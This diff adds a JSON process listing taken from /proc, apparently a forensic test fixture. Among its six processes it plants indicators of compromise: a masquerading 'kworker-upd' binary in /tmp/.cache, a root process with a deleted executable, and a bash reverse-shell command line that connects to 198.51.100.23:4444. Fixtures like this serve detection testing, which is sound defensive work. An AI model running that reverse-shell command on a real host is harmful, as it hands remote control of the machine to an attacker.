@@ -1,0 +1,134 @@
+{
+  "artifact": "processes",
+  "collected_at": "2026-03-10T12:00:00Z",
+  "errors": [],
+  "notes": [],
+  "records": [
+    {
+      "cmdline": [
+        "/sbin/init"
+      ],
+      "exe": "/usr/lib/systemd/systemd",
+      "exe_deleted": false,
+      "exe_sha256": "5d736ce0dc192d9fd86389a62de2669c991ec378a67b16ccfcdd4fdd100849e0",
+      "gid_effective": 0,
+      "gid_real": 0,
+      "kernel_thread": false,
+      "name": "systemd",
+      "pid": 1,
+      "ppid": 0,
+      "start_time": "2026-03-07T16:13:20Z",
+      "state": "S",
+      "uid_effective": 0,
+      "uid_real": 0,
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/usr/sbin/sshd",
+        "-D"
+      ],
+      "exe": "/usr/sbin/sshd",
+      "exe_deleted": false,
+      "exe_sha256": "c8a17e6b2a54f45f2a51b4dc470651ca0d49f8bb90b4ec3ce7a036fbf7abeab7",
+      "gid_effective": 0,
+      "gid_real": 0,
+      "kernel_thread": false,
+      "name": "sshd",
+      "pid": 412,
+      "ppid": 1,
+      "start_time": "2026-03-07T16:13:20Z",
+      "state": "S",
+      "uid_effective": 0,
+      "uid_real": 0,
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/tmp/.cache/kworker-upd",
+        "--daemon"
+      ],
+      "exe": "/tmp/.cache/kworker-upd",
+      "exe_deleted": false,
+      "exe_sha256": "ac42db2b771c6400dd73ea1072446ea2af0719b733c12c0907ad76c85c0a4cce",
+      "gid_effective": 1000,
+      "gid_real": 1000,
+      "kernel_thread": false,
+      "name": "kworker-upd",
+      "pid": 977,
+      "ppid": 1,
+      "start_time": "2026-03-07T17:53:20Z",
+      "state": "S",
+      "uid_effective": 1000,
+      "uid_real": 1000,
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/usr/bin/oldsvc"
+      ],
+      "exe": "/usr/bin/oldsvc",
+      "exe_deleted": true,
+      "gid_effective": 0,
+      "gid_real": 0,
+      "kernel_thread": false,
+      "name": "oldsvc",
+      "pid": 1203,
+      "ppid": 1,
+      "start_time": "2026-03-07T18:10:00Z",
+      "state": "S",
+      "uid_effective": 0,
+      "uid_real": 0,
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "mysql",
+        "--user=app",
+        "--password=[REDACTED]",
+        "-h",
+        "db.example.test"
+      ],
+      "exe": "/usr/bin/bash",
+      "exe_deleted": false,
+      "exe_sha256": "973c9895a3999003f752276a89d0687ece63e5a5b7ef9e0222f8485c97ff8e33",
+      "gid_effective": 1000,
+      "gid_real": 1000,
+      "kernel_thread": false,
+      "name": "mysql",
+      "pid": 1310,
+      "ppid": 412,
+      "start_time": "2026-03-07T18:11:40Z",
+      "state": "S",
+      "uid_effective": 1000,
+      "uid_real": 1000,
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "bash",
+        "-c",
+        "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"
+      ],
+      "exe": "/usr/bin/bash",
+      "exe_deleted": false,
+      "exe_sha256": "973c9895a3999003f752276a89d0687ece63e5a5b7ef9e0222f8485c97ff8e33",
+      "gid_effective": 1000,
+      "gid_real": 1000,
+      "kernel_thread": false,
+      "name": "bash",
+      "pid": 1400,
+      "ppid": 412,
+      "start_time": "2026-03-07T18:13:20Z",
+      "state": "S",
+      "uid_effective": 1000,
+      "uid_real": 1000,
+      "visibility": "full"
+    }
+  ],
+  "schema_version": 1,
+  "sources": [
+    "/proc"
+  ],
+  "status": "ok"
+}
